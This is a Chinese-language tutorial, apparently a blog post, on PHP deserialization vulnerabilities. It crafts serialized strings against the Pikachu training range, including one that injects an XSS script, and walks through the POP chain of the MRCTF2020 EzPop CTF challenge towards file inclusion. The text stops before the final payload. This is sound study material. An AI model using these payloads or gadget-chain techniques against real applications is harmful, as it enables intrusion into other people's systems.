<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__construct</span><br><span class="line">abc</span><br><span class="line">__toString</span><br><span class="line">__sleep</span><br><span class="line">__wakeup</span><br><span class="line">__toString</span><br><span class="line">__destruct</span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure>
<h3 id="最简单的例子">最简单的例子</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$only</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;only;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>尝试构造负载,将<code>$only="demo"</code>覆盖掉</p>
<p>类名为"A",只有一个字符</p>
<p>类有一个成员变量,没有显式<code>__serialize</code>指定键名,因此序列化字符串中的键就是变量名<code>$only</code>,显然这个键名长度为4字符,</p>
<p>值就根据需要修改了</p>
<p>因此可以构造出序列化字符串:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=O:1:&quot;A&quot;:1:&#123;s:4:&quot;only&quot;;s:6:&quot;empire&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721010820412.png"
alt="image-20220721010820412" />
<figcaption aria-hidden="true">image-20220721010820412</figcaption>
</figure>
<h3 id="pikachu靶场-php反序列化漏洞">pikachu靶场-php反序列化漏洞</h3>
<p>靶场没有给任何提示,也没有给源代码,目前我猜不出这个类有几个成员,都叫啥,有没有显式<code>__serialize</code>等等,还是看看后端的代码吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;<span class="comment">//反序列化不成功则 大兄弟,来点劲爆点儿的!</span></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;<span class="comment">//反序列化成功,则构造好$html,待会儿要向前端打印该值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ...</span><br><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$html</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>显然根据刚才最简单的例子,可以构造一个序列化字符串覆盖掉<code>$test="pikachu"</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:6:&quot;empire&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721011634848.png"
alt="image-20220721011634848" />
<figcaption aria-hidden="true">image-20220721011634848</figcaption>
</figure>
<p>既然如此,<code>6:"empire"</code>这里只需要按照<code>负载字符串长度:"负载字符串"</code>这种格式随便改.如果改成XSS攻击语句,往前端一打印不就实现XSS攻击了吗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:26:&quot;&lt;script&gt;alert(0);&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220721011848980.png"
alt="image-20220721011848980" />
<figcaption aria-hidden="true">image-20220721011848980</figcaption>
</figure>
<h3 id="反序列化成员对象">反序列化成员对象</h3>
<p>前面的例子和靶场中,反序列化构造的成员变量都是字符串类型,</p>
<p>能否用反序列化充实一个成员对象呢?</p>
<p>显然可以</p>
<p>以链表类为例子,</p>
<p>链表节点<code>LinkedNode</code>有两个成员,一个是本节点的value值,另一个是下一个节点的引用next</p>
<p>链表类<code>LinkedList</code>有一个成员,即附加头节点成员对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedNode</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$next</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span>=<span class="number">0</span>,<span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="variable">$v</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNext</span>(<span class="params"><span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insertHead</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$node</span>=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="variable">$v</span>,<span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">setNext</span>(<span class="variable">$node</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$linkedlist</span>=<span class="keyword">new</span> <span class="title class_">LinkedList</span>;</span><br><span class="line"><span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">insertHead</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">insertHead</span>(<span class="string">&quot;empire&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$linkedlist</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>实例化一个链表对象linkedlist,插入两个节点,然后对其序列化得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;LinkedList&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">&quot;LinkedListhead&quot;</span>;</span><br><span class="line">                     O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">0</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;empire&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">1</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;N;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这一长串太不直观,换行缩进一下得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;LinkedList&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">&quot;LinkedListhead&quot;</span>;</span><br><span class="line">    O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">0</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;empire&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">            O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">1</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;N;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最外层是LinkedList实例</p>
<p>从第二层开始都是LinkedNode实例,其结构为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;LinkedNode&quot;:2:&#123;</span><br><span class="line">	s:17:&quot;LinkedNodevalue&quot;;&lt;类型&gt;:&lt;值&gt;;s:16:&quot;LinkedNodenext&quot;:</span><br><span class="line">		下一个LinkedNode实例;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑如图所示结构,应怎么用序列化表示呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">subgraph linkedlist</span><br><span class="line">	head--&gt;A--&gt;510--&gt;C--&gt;empire--&gt;10--&gt;NULL</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;LinkedList&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">&quot;LinkedListhead&quot;</span>;</span><br><span class="line">    O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">0</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        	O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">510</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        		O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">        			O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;empire&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;</span><br><span class="line">           				O:<span class="number">10</span>:<span class="string">&quot;LinkedNode&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">17</span>:<span class="string">&quot;LinkedNodevalue&quot;</span>;i:<span class="number">10</span>;s:<span class="number">16</span>:<span class="string">&quot;LinkedNodenext&quot;</span>;N;&#125;</span><br><span class="line">           			&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pop链">POP链</h2>
<p>多次利用反序列化漏洞,可能要反序列化得到多个对象,最终找到可利用点</p>
<p>类似于pwn中的面向返回编程</p>
<h3 id="mrctf2020-ezpop"><a
target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BMRCTF2020%5DEzpop">MRCTF2020-EzPop</a></h3>
<p>上来就给源码,显然是<code>highlight_file(__FILE__);</code>的功劳</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;<span class="comment">//普通成员函数</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//append有文件包含,value参数应该是一个文件,显然这里应该是flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//本类对象被当作函数调用的时候自动调用__invoke</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);<span class="comment">//本类成员作为仿函数被调用时,调用append(var),那么var应该是&quot;flag.php&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分析到此,Modifier类的作用大体上是:</span></span><br><span class="line"><span class="comment">//本类对象应当作为其他类对象的成员对象,并且$var应该设置为flag.php,然后等待被别人调用__invoke得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="comment">//缺省参数</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//unserialize先调用__wakeup,显然本类应该是 反序列化突破口</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//访问不存在的属性或者protected,private属性时,自动调用__get</span></span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//给源码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个调用链是怎样的呢?</p>
<p>从Show类入口,观察其<code>__wakeup</code>函数,貌似做了一个黑名单过滤,不允许<code>__$this-&gt;source</code>有黑名单中的字样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//unserialize先调用__wakeup,显然本类应该是 反序列化突破口</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是,<code>$this-&gt;source</code>一定是一个字符串吗?如果是一个实现了<code>__toString</code>魔术函数的对象也可以啊.</p>
<p>这三个类只有Show实现了<code>__toString</code>,因此<code>$source</code>应该是一个<code>Show</code>类的对象</p>
<p>现在皮球从<code>Show::__wakeup</code>踢到了<code>Show::__toString</code>脚下</p>
<p>Show类的<code>__toString</code>干了啥呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>str如果是一个字符串,对他应用成员运算符<code>-&gt;</code>必然出错,</p>
<p>但是如果str不是字符串,是一个对象呢?</p>
<p>是谁的对象呢?从<code>str-&gt;source</code>,直觉上还是Show的对象,但是这样转起来没完了,一直在Show里面没有进展</p>
<p>那么str应该是谁的对象呢?</p>
<p>考虑到<code>Test::__get</code>这个函数,当调用<code>Test</code>类中不存在的成员时,<code>__get</code>函数会被调用</p>
<p>而<code>Test</code>不含这个叫做<code>source</code>的成员,因此皮球可以踢给<code>Test::__get</code></p>
<p><code>Test</code>类的<code>__get</code>干了啥呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//访问不存在的属性或者protected,private属性时,自动调用__get</span></span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用一个<code>$function</code>变量拷贝了本对象的p成员,然后作为函数调用</p>
<p>那么本类的<code>p</code>成员要么是一个函数,要么是一个实现了<code>__invoke</code>的仿函数类,显然<code>Modifier</code>类实现了<code>__invoke</code>函数</p>
<p>皮球踢到了<code>Modifier::__invoke</code>脚下,它干了啥呢?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;<span class="comment">//普通成员函数</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//append有文件包含,value参数应该是一个文件,显然这里应该是flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//本类对象被当作函数调用的时候自动调用__invoke</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);<span class="comment">//本类成员作为仿函数被调用时,调用append(var),那么var应该是&quot;flag.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__invoke</code>调用了<code>append($this-&gt;var)</code>,将<code>$var</code>文件包含进来</p>
<p>控制流分析完毕,下面考虑如何构造序列化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Show对象,用于骗过Show::__wakeup</span><br><span class="line">	source:Show对象,用于执行Show::__toString</span><br><span class="line">				source:随便</span><br><span class="line">				str:Test对象,用于执行__get</span><br><span class="line">						p:Modifier对象,用于执行__invoke</span><br><span class="line">								var:&quot;flag.php&quot;//此处有问题,直接写flag.php得不到flag</span><br><span class="line">	str:随便</span><br><span class="line"></span><br></pre></td></tr></table></figure>
